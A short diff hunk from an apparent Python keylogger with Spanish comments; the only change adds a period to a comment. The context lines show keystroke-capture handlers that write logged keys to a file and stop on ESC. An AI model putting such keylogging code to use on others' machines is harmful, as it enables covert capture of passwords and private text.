@@ -30,7 +30,7 @@ def on_press(key):
         write_to_file()
 
 def on_release(key):
-    # Detiene el keylogger si se presiona la tecla ESC
+    # Detiene el keylogger si se presiona la tecla ESC.
     if key == keyboard.Key.esc:
         write_to_file()  # Guarda cualquier dato restante antes de salir
         return False
